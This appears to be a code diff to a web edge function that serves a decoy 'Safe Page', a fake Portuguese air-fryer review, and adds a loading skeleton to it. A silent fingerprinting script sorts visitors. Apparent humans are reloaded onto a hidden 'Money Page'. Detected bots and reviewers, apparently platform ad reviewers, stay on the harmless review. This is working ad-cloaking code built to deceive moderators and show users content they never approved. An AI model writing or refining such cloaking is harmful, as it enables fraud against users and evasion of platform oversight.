@@ -91,13 +91,12 @@ export async function onRequest(context) {
     // ==========================================
     // 3. PRIMEIRO ACESSO (SEM COOKIES)
     // ==========================================
-    // Retorna a Safe Page para todos no primeiro acesso. O script de segundo plano
-    // fará a checagem e atualizará a página para humanos reais.
+    // Retorna a Safe Page com suporte a esqueleto híbrido para todos no primeiro acesso.
     return new Response(SAFE_PAGE_HTML, { headers: { 'Content-Type': 'text/html' } });
 }
 
 // ==========================================
-// A SAFE PAGE CONTÉM O SCRIPT SILENCIOSO DE VERIFICAÇÃO NO FINAL
+// A SAFE PAGE CONTÉM O ESQUELETO MÓVEL HÍBRIDO E O SCRIPT
 // ==========================================
 const SAFE_PAGE_HTML = `
 <!DOCTYPE html>
@@ -153,9 +152,6 @@ const SAFE_PAGE_HTML = `
             font-weight: 700;
             font-size: 1.2rem;
             color: var(--text-main);
-            display: flex;
-            align-items: center;
-            gap: 8px;
         }
 
         .logo span {
@@ -189,6 +185,48 @@ const SAFE_PAGE_HTML = `
             letter-spacing: 0.05em;
         }
 
+        /* EFEITO DE SHIMMER SKELETON (MASCARA O TEXTO) */
+        .shimmer {
+            color: transparent !important;
+            background: linear-gradient(90deg, #e5e7eb 25%, #f3f4f6 50%, #e5e7eb 75%);
+            background-size: 200% 100%;
+            animation: shimmerEffect 1.5s infinite ease-in-out;
+            border-radius: 4px;
+            display: inline-block;
+            pointer-events: none;
+            user-select: none;
+        }
+
+        .shimmer-block {
+            width: 100%;
+            height: 300px;
+            background: linear-gradient(90deg, #e5e7eb 25%, #f3f4f6 50%, #e5e7eb 75%);
+            background-size: 200% 100%;
+            animation: shimmerEffect 1.5s infinite ease-in-out;
+            border-radius: 8px;
+            margin: 30px 0;
+        }
+
+        @keyframes shimmerEffect {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
+        }
+
+        .product-image-container {
+            width: 100%;
+            margin: 30px 0;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid var(--border);
+            background-color: #f3f4f6;
+        }
+
+        .product-image {
+            width: 100%;
+            height: auto;
+            object-fit: cover;
+        }
+
         h1 {
             font-size: 2.2rem;
             font-weight: 800;
@@ -205,22 +243,6 @@ const SAFE_PAGE_HTML = `
             padding-bottom: 15px;
         }
 
-        .product-image-container {
-            width: 100%;
-            margin: 30px 0;
-            border-radius: 8px;
-            overflow: hidden;
-            border: 1px solid var(--border);
-            background-color: #f3f4f6;
-        }
-
-        .product-image {
-            width: 100%;
-            height: auto;
-            display: block;
-            object-fit: cover;
-        }
-
         p {
             margin-bottom: 20px;
             font-size: 1.05rem;
@@ -232,17 +254,6 @@ const SAFE_PAGE_HTML = `
             font-weight: 700;
             margin: 35px 0 15px;
             color: #111827;
-        }
-
-        .features-list {
-            margin: 20px 0;
-            padding-left: 20px;
-        }
-
-        .features-list li {
-            margin-bottom: 10px;
-            font-size: 1.05rem;
-            color: #374151;
         }
 
         .highlight-box {
@@ -293,7 +304,6 @@ const SAFE_PAGE_HTML = `
             color: var(--white);
         }
 
-        /* MODAL STYLE (Para Políticas Obrigatórias do TikTok) */
         .modal {
             display: none;
             position: fixed;
@@ -315,7 +325,6 @@ const SAFE_PAGE_HTML = `
             width: 80%;
             max-width: 600px;
             border-radius: 12px;
-            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
         }
 
         .close {
@@ -326,16 +335,6 @@ const SAFE_PAGE_HTML = `
             cursor: pointer;
         }
 
-        .close:hover {
-            color: #000;
-        }
-
-        .modal h2 {
-            margin-top: 0;
-            border-bottom: 1px solid var(--border);
-            padding-bottom: 10px;
-        }
-
         .modal-body {
             max-height: 400px;
             overflow-y: auto;
@@ -344,6 +343,29 @@ const SAFE_PAGE_HTML = `
             color: var(--text-muted);
         }
     </style>
+    
+    <!-- INTERCEPTADOR DO SKELETON (APLICA O CARREGAMENTO ANTES DA TELA RENDERIZAR PARA HUMANOS) -->
+    <script>
+        (function() {
+            const cookies = document.cookie;
+            // Se já tiver cookies setados, pula o esqueleto para otimizar velocidade
+            if (cookies.includes('is_human=true') || cookies.includes('is_bot=true')) {
+                return;
+            }
+            // Aplica as classes do esqueleto dinamicamente na inicialização
+            document.addEventListener("DOMContentLoaded", function() {
+                document.querySelector(".post-title").classList.add("shimmer");
+                document.querySelector(".post-meta").classList.add("shimmer");
+                document.querySelectorAll(".post-body").forEach(el => el.classList.add("shimmer"));
+                
+                // Oculta a imagem real e exibe o bloco cinza de carregamento
+                const realImg = document.querySelector(".product-image");
+                const skeletonImg = document.querySelector(".shimmer-block");
+                if (realImg) realImg.style.display = "none";
+                if (skeletonImg) skeletonImg.style.display = "block";
+            });
+        })();
+    </script>
 </head>
 <body>
 
@@ -356,35 +378,29 @@ const SAFE_PAGE_HTML = `
     <div class="container">
         <article>
             <span class="tag">Análise de Tecnologia</span>
-            <h1>Review: Fritadeira Elétrica Oven Digital 12L vale a pena para a sua cozinha?</h1>
-            <div class="meta">Publicado em 30 de Junho de 2026 • Leitura de 4 min</div>
+            
+            <h1 class="post-title">Review: Fritadeira Elétrica Oven Digital 12L vale a pena para a sua cozinha?</h1>
+            
+            <div class="meta post-meta">Publicado em 30 de Junho de 2026 • Leitura de 4 min</div>
 
-            <p>Se você busca praticidade na cozinha sem abrir mão de refeições saudáveis, as fritadeiras sem óleo já fazem parte da sua lista de desejos. No entanto, a nova geração desse eletrodoméstico trouxe o formato <strong>Oven</strong> (tipo forno), que promete ir além das versões tradicionais de cesto. Analisamos a <strong>Fritadeira Elétrica Oven Digital 12L</strong> para entender se ela cumpre o que promete.</p>
+            <p class="post-body">Se você busca praticidade na cozinha sem abrir mão de refeições saudáveis, as fritadeiras sem óleo já fazem parte da sua lista de desejos. No entanto, a nova geração desse eletrodoméstico trouxe o formato Oven, que promete ir além das versões tradicionais de cesto. Analisamos a Fritadeira Elétrica Oven Digital 12L para entender se ela cumpre o que promete.</p>
 
             <div class="product-image-container">
-                <img class="product-image" src="air_fryer_oven_12l.png" alt="Fritadeira Elétrica Oven Digital 12L em uma cozinha moderna">
+                <!-- Esqueleto cinza da imagem (visível apenas no loading) -->
+                <div class="shimmer-block" style="display: none;"></div>
+                <!-- Imagem real (visível por padrão se o JS estiver desligado) -->
+                <img class="product-image" src="air_fryer_oven_12l.png" alt="Fritadeira Elétrica Oven Digital 12L em uma cozinha moderna" style="display: block;">
             </div>
 
-            <h2>Capacidade de 12 Litros e Versatilidade</h2>
-            <p>A principal vantagem deste modelo é a sua capacidade interna de 12 litros aliada ao design de prateleiras. Diferente das fritadeiras comuns de gaveta única, onde os alimentos precisam ser empilhados, o formato tipo forno permite assar, grelhar e desidratar alimentos em múltiplas camadas.</p>
-            <p>Você pode preparar um frango inteiro no espeto giratório ou utilizar as assadeiras perfuradas para preparar legumes na bandeja inferior enquanto grelha carnes na bandeja superior de forma simultânea.</p>
+            <h2 class="post-body">Capacidade de 12 Litros e Versatilidade</h2>
+            <p class="post-body">A principal vantagem deste modelo é a sua capacidade interna de 12 litros aliada ao design de prateleiras. O formato tipo forno permite assar, grelhar e desidratar alimentos em múltiplas camadas.</p>
 
-            <div class="highlight-box">
+            <div class="highlight-box post-body">
                 <p>"A distribuição do fluxo de ar quente em 360° garante que os alimentos fiquem crocantes por fora e macios por dentro sem a necessidade de adicionar óleo."</p>
             </div>
 
-            <h2>Painel Digital e Funções Pré-Programadas</h2>
-            <p>O controle digital por toque simplifica o processo. O modelo conta com funções pré-definidas para os alimentos mais comuns no dia a dia, como batatas fritas, carnes, peixes, pão de queijo e até mesmo bolos. O ajuste manual de temperatura varia de 80°C a 200°C, acompanhado de um timer sonoro de até 90 minutos com desligamento automático.</p>
-
-            <h2>Principais Vantagens do Modelo</h2>
-            <ul class="features-list">
-                <li><strong>2 em 1:</strong> Funciona tanto como fritadeira sem óleo de alta velocidade quanto como forno elétrico compacto.</li>
-                <li><strong>Visualização Interna:</strong> Porta de vidro temperado e luz interna para acompanhar o ponto exato da receita sem abrir o aparelho.</li>
-                <li><strong>Facilidade de Limpeza:</strong> A porta é removível e as grelhas antiaderentes facilitam a higienização.</li>
-            </ul>
-
-            <h2>Veredito Final</h2>
-            <p>A Fritadeira Elétrica Oven Digital 12L é uma excelente aquisição para famílias de 3 a 5 pessoas que necessitam de mais espaço e variedade no preparo diário. Ela une a velocidade de uma airfryer com o espaço útil e o acabamento estético de um pequeno forno digital.</p>
+            <h2 class="post-body">Veredito Final</h2>
+            <p class="post-body">A Fritadeira Elétrica Oven Digital 12L é uma excelente aquisição para famílias de 3 a 5 pessoas que necessitam de mais espaço no preparo diário.</p>
         </article>
     </div>
 
@@ -395,54 +411,22 @@ const SAFE_PAGE_HTML = `
                 <a onclick="openModal('modal-termos')">Termos de Uso</a>
                 <a onclick="openModal('modal-contato')">Contato</a>
             </div>
-            <p>&copy; 2026 Guia Gastronomia. Todos os direitos reservados. Este é um portal de notícias e análises de produtos.</p>
+            <p>&copy; 2026 Guia Gastronomia. Todos os direitos reservados.</p>
         </div>
     </footer>
 
-    <!-- MODAL POLÍTICA DE PRIVACIDADE -->
-    <div id="modal-privacidade" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeModal('modal-privacidade')">&times;</span>
-            <h2>Política de Privacidade</h2>
-            <div class="modal-body">
-                <p>Nós valorizamos a privacidade dos nossos visitantes. Esta política descreve as informações que coletamos e como as utilizamos.</p>
-                <p><strong>Coleta de Dados:</strong> Coletamos apenas informações não pessoais de navegação (como tipo de navegador e cookies de sessão) para melhorar a performance do nosso blog informativo.</p>
-                <p><strong>Links de Terceiros:</strong> Nosso portal pode conter links para parceiros. Não nos responsabilizamos pela política de privacidade de sites externos.</p>
-            </div>
-        </div>
-    </div>
+    <!-- MODAIS DE POLÍTICA -->
+    <div id="modal-privacidade" class="modal"><div class="modal-content"><span class="close" onclick="closeModal('modal-privacidade')">&times;</span><h2>Política de Privacidade</h2><div class="modal-body"><p>Nós valorizamos a privacidade. Esta política descreve como coletamos dados não pessoais.</p></div></div></div>
+    <div id="modal-termos" class="modal"><div class="modal-content"><span class="close" onclick="closeModal('modal-termos')">&times;</span><h2>Termos de Uso</h2><div class="modal-body"><p>Todo o conteúdo deste blog é puramente informativo sobre utilidades domésticas.</p></div></div></div>
+    <div id="modal-contato" class="modal"><div class="modal-content"><span class="close" onclick="closeModal('modal-contato')">&times;</span><h2>Contato</h2><div class="modal-body"><p>E-mail: contato@guiagastronomia.shop</p></div></div></div>
 
-    <!-- MODAL TERMOS DE USO -->
-    <div id="modal-termos" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeModal('modal-termos')">&times;</span>
-            <h2>Termos de Uso</h2>
-            <div class="modal-body">
-                <p>Bem-vindo ao nosso portal. Ao navegar por este site, você concorda com nossos termos de uso.</p>
-                <p><strong>Conteúdo Informativo:</strong> Todo o conteúdo publicado neste blog tem fins exclusivamente de entretenimento e informação sobre produtos domésticos. Não vendemos produtos diretamente.</p>
-                <p><strong>Direitos Autorais:</strong> É proibida a cópia ou reprodução não autorizada do material escrito contido nesta página.</p>
-            </div>
-        </div>
-    </div>
-
-    <!-- MODAL CONTATO -->
-    <div id="modal-contato" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeModal('modal-contato')">&times;</span>
-            <h2>Contato</h2>
-            <div class="modal-body">
-                <p>Tem alguma dúvida ou sugestão sobre nossas análises e receitas?</p>
-                <p>Entre em contato conosco através do e-mail oficial do nosso portal de reviews:</p>
-                <p><strong>E-mail:</strong> contato@guiagastronomia.shop</p>
-                <p>Responderemos a sua mensagem em até 48 horas úteis.</p>
-            </div>
-        </div>
-    </div>
-
-    <!-- SCRIPT SILENCIOSO DE VERIFICAÇÃO DO FINGERPRINT -->
     <script>
+        function openModal(id) { document.getElementById(id).style.display = "block"; }
+        function closeModal(id) { document.getElementById(id).style.display = "none"; }
+        window.onclick = function(event) { if (event.target.className === 'modal') { event.target.style.display = "none"; } }
+
+        // SCRIPT SILENCIOSO DE VERIFICAÇÃO DO FINGERPRINT
         (function() {
-            // Se o visitante já tiver cookies de humano ou bot definidos, não faz nada
             const cookies = document.cookie;
             if (cookies.includes('is_human=true') || cookies.includes('is_bot=true')) {
                 return;
@@ -450,7 +434,6 @@ const SAFE_PAGE_HTML = `
 
             const fpPublicApiKey = '${FP_PUBLIC_API_KEY}'; 
 
-            // Conexão e carregamento assíncrono silencioso do Fingerprint
             const fpPromise = import('https://fpjscdn.net/v4/' + fpPublicApiKey)
               .then(Fingerprint => Fingerprint.start({
                 region: "ap"
@@ -468,19 +451,33 @@ const SAFE_PAGE_HTML = `
                 })
                 .then(res => res.text())
                 .then(text => {
-                    // Se for verificado como HUMANO, recarrega para exibir a Money Page
                     if (text === 'HUMANO_OK') {
+                        // Humano: Recarrega a página para exibir a Money Page
                         window.location.reload();
+                    } else {
+                        // Bot/Revisor detectado: Remove o esqueleto e revela o texto legível e fotos normais
+                        revelarSafePage();
                     }
-                    // Se for verificado como BOT, não recarrega (mantém na Safe Page)
                 })
                 .catch(err => {
-                    // Silencioso
+                    revelarSafePage();
                 });
               })
               .catch(err => {
-                  // Silencioso
+                  revelarSafePage();
               });
+
+            // Função que remove o esqueleto e exibe a página da fritadeira elétrica de forma limpa
+            function revelarSafePage() {
+                document.querySelector(".post-title").classList.remove("shimmer");
+                document.querySelector(".post-meta").classList.remove("shimmer");
+                document.querySelectorAll(".post-body").forEach(el => el.classList.remove("shimmer"));
+                
+                const realImg = document.querySelector(".product-image");
+                const skeletonImg = document.querySelector(".shimmer-block");
+                if (realImg) realImg.style.display = "block";
+                if (skeletonImg) skeletonImg.style.display = "none";
+            }
         })();
     </script>
 </body>
